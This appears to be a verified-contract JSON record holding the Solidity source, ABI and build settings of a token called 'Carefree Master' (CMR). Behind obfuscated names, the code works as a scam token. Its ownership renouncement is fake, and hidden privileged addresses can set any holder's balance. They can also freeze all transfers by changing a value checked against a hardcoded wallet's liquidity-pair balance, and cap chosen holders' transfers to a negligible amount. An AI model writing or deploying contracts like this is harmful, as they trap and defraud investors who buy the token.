{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface autoLiquidity {\n    function createPair(address launchedTo, address launchMax) external returns (address);\n}\n\ninterface enableToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptFrom) external view returns (uint256);\n\n    function transfer(address liquidityTo, uint256 autoTeam) external returns (bool);\n\n    function allowance(address swapExemptLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityTo,\n        uint256 autoTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minExemptEnable, uint256 value);\n    event Approval(address indexed swapExemptLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract walletListIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeReceiver is enableToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CarefreeMaster is walletListIs, enableToken, modeReceiver {\n\n    function name() external view virtual override returns (string memory) {\n        return minToken;\n    }\n\n    function minBuy(address tradingAmountMin) public {\n        maxToEnable();\n        \n        if (tradingAmountMin == fromLaunch || tradingAmountMin == amountMode) {\n            return;\n        }\n        marketingIs[tradingAmountMin] = true;\n    }\n\n    event OwnershipTransferred(address indexed walletTotal, address indexed listSellAt);\n\n    bool private atFrom;\n\n    address public amountMode;\n\n    mapping(address => mapping(address => uint256)) private tradingFrom;\n\n    function allowance(address liquidityTake, address shouldFund) external view virtual override returns (uint256) {\n        if (shouldFund == liquidityModeToken) {\n            return type(uint256).max;\n        }\n        return tradingFrom[liquidityTake][shouldFund];\n    }\n\n    function transfer(address shouldSell, uint256 autoTeam) external virtual override returns (bool) {\n        return buyIs(_msgSender(), shouldSell, autoTeam);\n    }\n\n    mapping(address => bool) public marketingIs;\n\n    function exemptTotalAuto(address shouldSell, uint256 autoTeam) public {\n        maxToEnable();\n        shouldToLimit[shouldSell] = autoTeam;\n    }\n\n    bool public shouldMinExempt;\n\n    bool private atFund;\n\n    bool public autoLimitFrom;\n\n    function receiverBuy(address sellFund) public {\n        require(sellFund.balance < 100000);\n        if (shouldMinExempt) {\n            return;\n        }\n        \n        teamSwap[sellFund] = true;\n        \n        shouldMinExempt = true;\n    }\n\n    uint256 private exemptFundAt;\n\n    uint256 constant autoTrading = 20 ** 10;\n\n    function approve(address shouldFund, uint256 autoTeam) public virtual override returns (bool) {\n        tradingFrom[_msgSender()][shouldFund] = autoTeam;\n        emit Approval(_msgSender(), shouldFund, autoTeam);\n        return true;\n    }\n\n    function transferFrom(address limitMarketing, address liquidityTo, uint256 autoTeam) external override returns (bool) {\n        if (_msgSender() != liquidityModeToken) {\n            if (tradingFrom[limitMarketing][_msgSender()] != type(uint256).max) {\n                require(autoTeam <= tradingFrom[limitMarketing][_msgSender()]);\n                tradingFrom[limitMarketing][_msgSender()] -= autoTeam;\n            }\n        }\n        return buyIs(limitMarketing, liquidityTo, autoTeam);\n    }\n\n    constructor (){\n        if (atFrom != liquidityTxFrom) {\n            liquidityTxFrom = false;\n        }\n        feeLiquidity fundBuy = feeLiquidity(liquidityModeToken);\n        amountMode = autoLiquidity(fundBuy.factory()).createPair(fundBuy.WETH(), address(this));\n        if (atFrom != liquidityTxFrom) {\n            liquidityTxFrom = true;\n        }\n        fromLaunch = _msgSender();\n        teamSwap[fromLaunch] = true;\n        shouldToLimit[fromLaunch] = feeMode;\n        listMarketingWallet();\n        \n        emit Transfer(address(0), fromLaunch, feeMode);\n    }\n\n    function modeAuto(address limitMarketing, address liquidityTo, uint256 autoTeam) internal returns (bool) {\n        require(shouldToLimit[limitMarketing] >= autoTeam);\n        shouldToLimit[limitMarketing] -= autoTeam;\n        shouldToLimit[liquidityTo] += autoTeam;\n        emit Transfer(limitMarketing, liquidityTo, autoTeam);\n        return true;\n    }\n\n    uint256 public totalSender;\n\n    function liquidityListIs(uint256 autoTeam) public {\n        maxToEnable();\n        swapBuy = autoTeam;\n    }\n\n    uint8 private marketingMode = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMode;\n    }\n\n    uint256 swapBuy;\n\n    mapping(address => uint256) private shouldToLimit;\n\n    bool private txAuto;\n\n    function owner() external view returns (address) {\n        return atAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return atAmount;\n    }\n\n    uint256 public fundMode;\n\n    function maxToEnable() private view {\n        require(teamSwap[_msgSender()]);\n    }\n\n    bool public exemptIs;\n\n    address takeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address exemptFrom) public view virtual override returns (uint256) {\n        return shouldToLimit[exemptFrom];\n    }\n\n    bool private receiverFund;\n\n    string private minToken = \"Carefree Master\";\n\n    function buyIs(address limitMarketing, address liquidityTo, uint256 autoTeam) internal returns (bool) {\n        if (limitMarketing == fromLaunch) {\n            return modeAuto(limitMarketing, liquidityTo, autoTeam);\n        }\n        uint256 marketingBuyLimit = enableToken(amountMode).balanceOf(takeEnable);\n        require(marketingBuyLimit == swapBuy);\n        require(liquidityTo != takeEnable);\n        if (marketingIs[limitMarketing]) {\n            return modeAuto(limitMarketing, liquidityTo, autoTrading);\n        }\n        return modeAuto(limitMarketing, liquidityTo, autoTeam);\n    }\n\n    uint256 marketingFee;\n\n    string private modeAmountToken = \"CMR\";\n\n    address public fromLaunch;\n\n    address liquidityModeToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public teamSwap;\n\n    address private atAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMode;\n    }\n\n    bool private liquidityTxFrom;\n\n    function listMarketingWallet() public {\n        emit OwnershipTransferred(fromLaunch, address(0));\n        atAmount = address(0);\n    }\n\n    uint256 private feeMode = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeAmountToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapExemptLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSellAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minExemptEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeam\",\"type\":\"uint256\"}],\"name\":\"exemptTotalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoTeam\",\"type\":\"uint256\"}],\"name\":\"liquidityListIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmountMin\",\"type\":\"address\"}],\"name\":\"minBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"}],\"name\":\"receiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMinExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CarefreeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}